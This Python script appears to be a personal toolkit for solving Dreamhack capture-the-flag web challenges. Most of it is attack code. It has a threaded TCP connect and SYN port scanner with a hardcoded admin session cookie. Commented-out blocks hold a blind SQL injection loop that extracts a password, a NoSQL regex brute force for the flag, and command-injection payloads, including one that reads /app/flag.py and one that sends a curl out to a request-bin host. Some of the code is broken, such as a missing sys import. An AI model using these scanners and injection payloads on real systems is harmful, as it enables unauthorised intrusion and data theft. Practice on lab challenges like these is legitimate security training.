import requests
import re
import string, json
import socket
import os, platform
import threading
from datetime import datetime
import math
from tqdm import tqdm
import time
import random
import yaml
with open ('flag.yml', encoding='UTF8') as file:
    dictionary = yaml.load(file, Loader=yaml.FullLoader)

host = dictionary['host']
port = '80'
url = host+':'+port
headers = {'Content-Type': 'application/json; charset=utf-8'}
cookies = {
        'username': 'admin',
        'sessionid': '20642b2f8484ec17cb44fa25680ead4791ac6bfedc29f04de00d364cf4d70c5f'}
data = {'cmd': 'ls'
        #'host': '8.8.8.8";cat "/app/flag.py'
        }
payloadSQL = dictionary['payloadSQL']
payloadCommandInjection = dictionary['payloadCommandInjection'] 
payloadCommand = dictionary['payloadCommand']
payloadLocalhost = dictionary['payloadLocalhost']
ALPHANUMERIC = string.digits + string.ascii_letters
flag = ''
def refineResponse(text):
    text = re.sub('<head>(.|\n)*</head>', '', text)
    text = re.sub('\n(\n|\s)*\n', '', text)
    return text
def detector(text):
    regex_flag = re.compile('(DH\{.*\}|Success|error)')
    detectedTexts = regex_flag.findall(response.text)
    return detectedTexts

def printLog(payload, responseText):
    print("================================================================")
    print("payload: " + payload)
    print(response.text)
################################ SCAN   #################################
import scapy.all as scapy
class Scan(threading.Thread):
    def __init__(self, ipList, portList, method):
        threading.Thread.__init__(self)
        self.method = method
        self.ip_src = socket.gethostbyname(socket.gethostname())
        self.ipList = ipList
        self.portList = portList
        #self.OS = platform.system()

        #if (self.OS == "Windows"):
        #    self.ping1 = "ping -n 1 "
        #elif (self.OS =="Linux"):
        #    self.ping1 = "ping -c 1 "
        #else:
        #    self.ping1 = "ping -c 1 "

    def run(self):
        try:
            if self.method == "open":
                for ip_dst in self.ipList:
                    for port_dst in self.portList:
                        socket_temp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        socket.setdefaulttimeout(1)
                        result = socket_temp.connect_ex((ip_dst, port_dst))
                        try:
                            service = socket.getservbyport(port_dst)
                        except:
                            service = "not found"
                        if result == 0:
                            print("ip ", ip_dst, ", port ", str(port_dst), " is opened. protocol is ", service)
                        else:
                            print("ip ", ip_dst, ", port ", str(port_dst), " is closed. protocol is ", service)
                        socket_temp.close()
            elif self.method == "syn":
                for ip_dst in self.ipList:
                    for port_dst in self.portList:
                        port_rand = random.randrange(1024, 65536)
                        ip = scapy.IP(src=self.ip_src, dst=ip_dst)
                        tcp = scapy.TCP(sport = port_rand, dport = port_dst, flags="S", seq=12345)
                        packet = ip/tcp
                        p = scapy.sr1(packet, inter=1, timeout = 4)
                        p.show
                        tcp = scapy.TCP(sport=port_rand, dport = port_dst, flags="R", seq=12347)
                        packet = ip/tcp
                        p = scapy.sr1(packet)
                        p.show()
        except KeyboardInterrupt:
            print("Keyboard inturrupt")
            sys.exit()
        except socket.gaierror:
            print("Hostname could not be resolved")
            sys.exit()
        except socket.error:
            print("Could not connect to server")
            sys.exit()

def urlParser(text):
    if type(text) is str:
        texts = [text]
    elif type(text) is list:
        texts = text
    else:
        return []
    urlList = []
    for text in texts: 
        #comma_seperator_regex = re.compile(r'(?:(?:[\d\.\-]*)(?=,\s))|(?:(?<=,\s)(?:[\d\.\-]*))|(\b(?:[\d\.\-]*)\b)')
        comma_seperator_regex = re.compile(r'(?:(?:25[0-6])|(?:2[0-5]\d)|(?:1\d{2})|(?:\d{1,2}))(?:\.(?:(?:25[0-6])|(?:2[0-5]\d)|(?:1\d{2})|(?:\d{1,2}))){3}(?:\-(?:(?:25[0-6])|(?:2[0-5]\d)|(?:1\d{2})|(?:\d{1,2}))(?:\.(?:(?:25[0-6])|(?:2[0-5]\d)|(?:1\d{2})|(?:\d{1,2}))){3})*')
        # comma_seperator_regex = re.compile("a")
        ip_start_regex = re.compile(r'(?:[\d\.]*)(?=\-)')
        ip_end_regex = re.compile(r'(?<=\-)(?:[\d\.]*)')
        seperated_by_comma = comma_seperator_regex.findall(text)
        seperated_by_comma = [url for url in seperated_by_comma if url] # 빈 문자열 제거
        for line in seperated_by_comma:
            if '-' in line:
                start = ip_start_regex.findall(line)[0].split('.')
                print("start: ", start[0], ", ", start[1], ", ", start[2], ", ", start[3])
                end = ip_end_regex.findall(line)[0].split('.')
                print("end: ", end[0], ", ", end[1], ", ", end[2], ", ", end[3])
                ip = [0, 0, 0, 0]
                print(type(start[0]))
                for ip[0] in range(int(start[0]), int(end[0])+1):
                    for ip[1] in range(int(start[1]), int(end[1])+1):
                        for ip[2] in range(int(start[2]), int(end[2])+1):
                            for ip[3] in range(int(start[3]), int(end[3])+1):
                                ip = list(map(str, ip))
                                urlList.append('.'.join(ip))
            else:
                urlList.append(line)
    return urlList
def portParser(text):
    if type(text) is str:
        texts = [text]
    elif type(text) is list:
        texts = text
    else:
        return []
    portList = []
    for text in texts:
        comma_seperator_regex = re.compile(r'(?:6553[0-5])|(?:655[0-2]\d)|(?:65[0-4]\d{2})|(?:6[0-4]\d{3})|(?:[0-5]\d{4})|(?:\d{1,4})(?:\-(?:(?:6553[0-5])|(?:655[0-2]\d)|(?:65[0-4]\d{2})|(?:6[0-4]\d{3})|(?:[0-5]\d{4})|(?:\d{1,4})))*')
        port_start_regex = re.compile(r'(?:[\d])*(?=\-)')
        port_end_regex = re.compile(r'(?<=\-)(?:[\d]*)')
        seperated_by_comma = comma_seperator_regex.findall(text)
        seperated_by_comma = [port for port in seperated_by_comma if port] # 빈 문자열 제거
        print("seperated by comma: ", seperated_by_comma)
        for text in seperated_by_comma:
            if '-' in text:
                start = port_start_regex.findall(text)[0]
                print("start: ", start)
                end = port_end_regex.findall(text)[0]
                print("end: ", end)
                for port in range(int(start), int(end)+1):
                    portList.append(port)
                    print("", str(port), " is joined")
            else:
                portList.append(text)

    portList = list(map(int, portList))
    return portList

def allScan(method):
    ip_regex = re.compile("(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}")
    # port_regex = re.compile("((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))")
    port_regex = re.compile("\d{1,5}")
    host = input("host: ")
    isValidIp = ip_regex.search(host).group(0)
    isValidPort = True
    if host == None:
        ipList = dictionary['ipList']
    elif not isValidIp:
        try:
            ip = socket.gethostbyname(host)
        except:
            print('no IP found')
            return
    else:
        ipList = urlParser(host)

    port = input("port: ")
    if port == None:
        portList = portParser(dictionary['portList'])
    else:
        portList = portParser(port)

    start_time = datetime.now()

    print("ipList: ", ipList)
    print("portList: ", portList)
    n_thread = 4
    if method == "open":
        for index in range(n_thread):
            portSubList = portList[index::n_thread]
            scan = Scan(ipList, portSubList, method)
            scan.start()
    elif method == "syn":
        for index in range(n_thread):
            portSubList = portList[index::n_thread]
            scan = Scan(ipList, portSubList, method)
            scan.start()


allScan("open")
################################ CANVAS  ################################
def existDetector(text):
    regex_exist = re.compile('exists')
    detectedTexts = regex_exist.findall(text)
    return detectedTexts
#pwLength = 0
#for index in range(50):
#    payload = 'admin\' and char_length(upw)='+str(index)+';--'
#    params = {
#        'uid': payload}
#    response = requests.get(url, params = params, verify=False)
#    printLog(payload, refineResponse(response.text))
#    if len(existDetector(response.text))>0:
#        pwLength = index
#        break
#countPw = []
#binaryPw = []
#for nthPw in range(1, pwLength+1):
#    for nthBit in range(128):
#        payload = 'admin\' and length(bin(ord(substr(upw, '+str(nthPw)+', 1))))='+str(nthBit)+';--'
#        params = {'uid': payload}
#        response = requests.get(url, params = params, verify=False)
#        #printLog('nthPw: '+str(nthPw)+', nthBit: '+str(nthbit), refineResponse(response.text))
#        if len(existDetector(response.text))>0:
#            bitarray = []
#            print(str(nthPw)+'th password: '+str(nthBit))
#            for bit in range(1, nthBit+1):
#                payload = 'admin\' and substr(bin(ord(substr(upw, '+str(nthPw)+', 1))), '+str(bit)+', 1)=0;--'
#                params = {'uid': payload}
#                response = requests.get(url, params = params, verify=False)
#                if len(existDetector(response.text))>0:
#                    bitarray += '0'
#                else:
#                    bitarray += '1'
#                print(bitarray)
#            binaryPw += bitarray
#            break
#
################################ PALETTE ################################

# response = requests.get(url, params = params, cookies=cookies, verify=False)
# response = requests.post(url, data=data)
# response = requests.head(url, verify=False)
# verify=False SSL 인증서 에러가 나서 추가해줬다.

# Blind injection
#for i in range(32):
#    for char in ALPHANUMERIC:
#        response = requests.get(host+':'+port+'/login?uid[$regex]=ad.in&upw[$regex]=^D.{'+flag+char+'.*}', verify=False)
#        if response.text.find('admin')!=-1:
#            flag += char
#            print(str(char))
#            break

################################ HISTORY ################################
#for payload in payloadCommandInjection:
#    data = {'host': '8.8.8.8'+payload}
#    response = requests.post(url, data=data)
#

#if len(regex_flag.findall(response.text))>0:
#    print(regex_flag.findall(response.text))
#else:
#    print(response.text)

#for param in payloadCommand:
#    params = {'cmd': param}
#    print("================================================================")
#    print("Command injection payload: " + param)
#    print(refineResponse(response.text))

# response = requests.head(url+'?cmd= curl https://mjmqxqr.request.dreamhack.games -d "hello"', verify=False)
